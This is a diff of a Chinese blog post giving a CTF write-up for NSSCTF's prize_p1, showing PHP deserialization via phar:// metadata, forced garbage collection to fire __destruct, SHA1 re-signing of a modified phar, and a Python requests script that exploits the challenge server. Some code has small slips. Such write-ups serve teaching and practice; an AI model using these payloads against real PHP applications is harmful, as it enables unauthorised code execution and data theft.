@@ -16,25 +16,27 @@
   <meta name="author" content="j0ker">
   <meta name="keywords" content="">
   
-    <meta name="description" content="php反序列化小trick之强制GC来看一道nssctf的prize_p1 12345678910111213141516171819202122232425262728293031&lt;?phphighlight_file(__FILE__);class getflag &amp;#123;    function __destruct() &amp;#123;        echo getenv(&amp;quo">
+    <meta name="description" content="php反序列化小trick之强制GC前言挺有意思的一个trick，通过phar反序列化进行强制GC，看了许多师傅的文章，这里做下总结。 prize_p1来看一道nssctf的prize_p1，附上Xenny师傅的B站链接：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1DM4y137cp 123456789101112131415161718192021222324252627">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php-gc">
+<meta property="og:title" content="php反序列化之强制GC">
 <meta property="og:url" content="http://example.com/2022/05/30/php-gc/index.html">
 <meta property="og:site_name" content="j0ker&#39;s blog">
-<meta property="og:description" content="php反序列化小trick之强制GC来看一道nssctf的prize_p1 12345678910111213141516171819202122232425262728293031&lt;?phphighlight_file(__FILE__);class getflag &amp;#123;    function __destruct() &amp;#123;        echo getenv(&amp;quo">
+<meta property="og:description" content="php反序列化小trick之强制GC前言挺有意思的一个trick，通过phar反序列化进行强制GC，看了许多师傅的文章，这里做下总结。 prize_p1来看一道nssctf的prize_p1，附上Xenny师傅的B站链接：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1DM4y137cp 123456789101112131415161718192021222324252627">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2022/05/30/php-gc/image-20220531104022122.png">
+<meta property="og:image" content="http://example.com/img/cover/php.jpg">
 <meta property="article:published_time" content="2022-05-30T15:21:05.000Z">
-<meta property="article:modified_time" content="2022-05-31T09:08:27.269Z">
+<meta property="article:modified_time" content="2022-06-01T05:33:18.654Z">
 <meta property="article:author" content="j0ker">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="gc回收">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2022/05/30/php-gc/image-20220531104022122.png">
+<meta name="twitter:image" content="http://example.com/img/cover/php.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>php-gc - j0ker&#39;s blog</title>
+  <title>php反序列化之强制GC - j0ker&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -213,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="php-gc"></span>
+            <span id="subtitle" data-typed-text="php反序列化之强制GC"></span>
           
         </div>
 
@@ -237,7 +239,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          3.5k 字
+          5.8k 字
         
       </span>
     
@@ -249,7 +251,7 @@
         
         
           <!-- compatible with older versions-->
-          30 分钟
+          49 分钟
         
       </span>
     
@@ -287,11 +289,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">php-gc</h1>
+            <h1 style="display: none">php反序列化之强制GC</h1>
             
             <div class="markdown-body">
               
-              <h3 id="php反序列化小trick之强制GC"><a href="#php反序列化小trick之强制GC" class="headerlink" title="php反序列化小trick之强制GC"></a>php反序列化小trick之强制GC</h3><p>来看一道nssctf的<a target="_blank" rel="noopener" href="https://www.ctfer.vip/problem/14">prize_p1</a></p>
+              <h3 id="php反序列化小trick之强制GC"><a href="#php反序列化小trick之强制GC" class="headerlink" title="php反序列化小trick之强制GC"></a>php反序列化小trick之强制GC</h3><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>挺有意思的一个trick，通过phar反序列化进行强制GC，看了许多师傅的文章，这里做下总结。</p>
+<h3 id="prize-p1"><a href="#prize-p1" class="headerlink" title="prize_p1"></a>prize_p1</h3><p>来看一道nssctf的<a target="_blank" rel="noopener" href="https://www.ctfer.vip/problem/14">prize_p1</a>，附上<a target="_blank" rel="noopener" href="https://space.bilibili.com/187378036">Xenny</a>师傅的B站链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1DM4y137cp">https://www.bilibili.com/video/BV1DM4y137cp</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">getflag</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> getenv(<span class="hljs-string">&quot;FLAG&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$config</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;config == <span class="hljs-string">&#x27;w&#x27;</span>) &#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);<br>            &#125;<br>            file_put_contents(<span class="hljs-string">&quot;./tmp/a.txt&quot;</span>, <span class="hljs-variable">$data</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;config == <span class="hljs-string">&#x27;r&#x27;</span>) &#123;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-number">0</span>];<br>            <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$data</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;那么就从这里开始起航吧&quot;</span>);<br></code></pre></td></tr></table></figure>
 
 <p>我们的最终目的是触发getflag类的<code>__destruct</code>方法来获取flag。</p>
@@ -338,16 +341,46 @@
 <p><code>unserialize($_GET[0]);</code>反序列化入口点，可以发现这里的反序列化是没有任何引用的，所以按照上述会在执行完毕之后处于<code>unset</code>状态，会回收这个对象，即执行<code>__destruct</code>方法，而还没有抛出异常，也就有了第一层的绕过,先反序列化A类。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;config&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;w&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
 
-<p>写文件后，我们需要利用file_get_contents函数，通过phar://协议进行反序列化操作。</p>
-<p>但是如果我们直接在phar文件的Metadata写<code>getflag</code>对象的话，显然是不能进行反序列化的，因为他反序列化之后会被phar对象的metadata属性引用，不符合unset情况，也就不会直接执行<code>__destruct</code>，则需等待手工调用或程序执行结束，手工调用肯定是不行的，我们并不能进行RCE，同理反序列化之后紧接就是抛出异常，程序也是不会正常结束的。</p>
+<p>写文件后，我们需要利用file_get_contents函数，通过phar://协议进行反序列化操作，<strong>这里需要注意，phar文件再通过压缩、打包等处理后依旧是可以用phar://协议读取内容。</strong></p>
+<h3 id="file-put-contents绕过"><a href="#file-put-contents绕过" class="headerlink" title="file_put_contents绕过"></a>file_put_contents绕过</h3><p>file_put_contents(“./tmp/a.txt”, $data)中，如果$data为数组，就可以直接绕过file_put_contents函数，读文件的file_get_contents函数也一样。</p>
+<h3 id="thorw的绕过"><a href="#thorw的绕过" class="headerlink" title="thorw的绕过"></a>thorw的绕过</h3><p>但是如果我们直接在phar文件的Metadata写<code>getflag</code>对象的话，显然是不能进行反序列化的，因为他反序列化之后会被phar对象的metadata属性引用，不符合unset情况，也就不会直接执行<code>__destruct</code>，则需等待手工调用或程序执行结束，手工调用肯定是不行的，我们并不能进行RCE，同理反序列化之后紧接就是抛出异常，程序也是不会正常结束的。</p>
 <p>这里的话，我们就需要利用GC来进行执行<code>__destruct</code>，</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;getflag&quot;</span>:&#123;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>考虑反序列化本字符串，我们可以发现，因为<b style="color:red;">反序列化的过程是顺序执行</b>的，所以到第一个属性是，会将<code>Array[0]</code>设置为<code>getflag</code>对象，同时我们又将<code>Array[0]</code>设置为<code>null</code>，这样前面的<code>getflag</code>对象便丢失了引用，就会被GC所捕获，便可以执行<code>__destruct</code>了。</p>
-<p>意思就是，反序列化时</p>
-<p><a target="_blank" rel="noopener" href="http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://arsenetang.com/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.andynoel.xyz/?p=264">http://www.andynoel.xyz/?p=264</a></p>
-<p>还有一篇外国佬的文章</p>
+<p>意思就是，我们需要反序列化一个数组，然后再利用第一个索引，来触发GC。</p>
+<p>举个栗子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]=<span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>]=<span class="hljs-keyword">new</span> A();<br>userialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
+
+<p>先序列化一个数组</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">getflag</span></span>&#123;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> getflag();<br><span class="hljs-variable">$b</span>= <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">echo</span> serialize([<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>]);<br><br><span class="hljs-comment">//a:2:&#123;i:0;O:7:&quot;getflag&quot;:0:&#123;&#125;i:1;N;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>再将第二个i改成0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;getflag&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>好了，知道如何处理了，那就先构造个phar文件吧</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">getflag</span></span>&#123;<br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> getflag();<br><span class="hljs-variable">$b</span>= <span class="hljs-literal">null</span>;<br><br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;joker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;setMetadata([<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>]);<br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;a.txt&quot;</span>,<span class="hljs-string">&quot;joker&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure>
+
+<p>用010修改phar文件，将第二个改成0，但如果直接这样利用phar://协议读取，会出现 sha1签名错误(signature could not be verified)，停止解析。绕过签名有以下两种方法：</p>
+<h4 id="1-利用phar文件格式，重新生成修改后的phar的sha1值。"><a href="#1-利用phar文件格式，重新生成修改后的phar的sha1值。" class="headerlink" title="1.利用phar文件格式，重新生成修改后的phar的sha1值。"></a>1.利用phar文件格式，重新生成修改后的phar的sha1值。</h4><p>根据php手册上面的官方解释，Phar文件倒数的28字节为签名。其中最后四个为GBMB。其中[-8:-28]为我们的sha1签名。那么我们可以根据文件内容重写sha1值。</p>
+<img src="/2022/05/30/php-gc/image-16540533322934.png" srcset="/img/loading.gif" lazyload class="" title="image">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./joker.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<span class="hljs-comment"># 修改内容后的phar文件</span><br>data = f[:-<span class="hljs-number">28</span>]<span class="hljs-comment"># 获取要签名的数据</span><br>sig = f[-<span class="hljs-number">8</span>:]<span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>out = data + hashlib.sha1(data).digest() + sig<span class="hljs-comment"># 数据 + 签名 + 类型 + GBMB</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./exp.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> n:<br>	n.write(out)<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-利用压缩文件"><a href="#2-利用压缩文件" class="headerlink" title="2.利用压缩文件"></a>2.利用压缩文件</h4><p>根据<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/uxwHLckwx/">guoke师傅的文章</a>，tar文件的识别反序列化是识别文件名是否以.phar/.metadata开头的,那么写入metadata里的内容就能够成功被反序列化。</p>
+<p><strong>5种可以触发phar的操作：</strong></p>
+<ul>
+<li>普通phar</li>
+<li>gzip</li>
+<li>bzip2</li>
+<li>tar</li>
+<li>zip</li>
+</ul>
+<p>先建一个.phar文件夹，再在文件夹里面创一个.metadata文件，然后把我们的反序列化内容<code>a:2:&#123;i:0;O:7:&quot;getflag&quot;:0:&#123;&#125;i:1;N;&#125;</code>写入.metadata文件。</p>
+<p>在linux下将.phar文件夹压缩成tar文件。再利用python读文件，传入a.txt，phar反序列化读取即可。</p>
+<p>签名的问题搞好了，接下来就是怎么传值了，利用第一种方法，直接python发包。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> gzip<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&#x27;http://1.14.71.254:28652/&#x27;</span><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp.phar&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-comment">#打开文件</span><br>file_out = gzip.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp.zip&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>)<span class="hljs-comment">#创建压缩文件对象</span><br>file_out.writelines(file)<br>file_out.close()<br>file.close()<br><br>requests.post(<br>    url,<br>    params=&#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&#x27;O:1:&quot;A&quot;:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span><br>    &#125;,<br>    data=&#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./phar.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    &#125;<br>) <span class="hljs-comment"># 写入</span><br><br>res = requests.post(<br>    url,<br>    params=&#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;</span><br>    &#125;,<br>    data=&#123;<br>        <span class="hljs-number">0</span>: <span class="hljs-string">&#x27;phar://tmp/a.txt&#x27;</span><br>    &#125;<br>) <span class="hljs-comment"># 触发</span><br><br>flag = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(NSSCTF\&#123;.+?\&#125;)&#x27;</span>).findall(res.text)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
 
               
             </div>
@@ -355,6 +388,36 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
+      
+        <a href="/tags/gc%E5%9B%9E%E6%94%B6/">#gc回收</a>
+      
+    </div>
   
 </div>
 
@@ -364,7 +427,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>php-gc</div>
+      <div>php反序列化之强制GC</div>
       <div>http://example.com/2022/05/30/php-gc/</div>
     </div>
     <div class="license-meta">
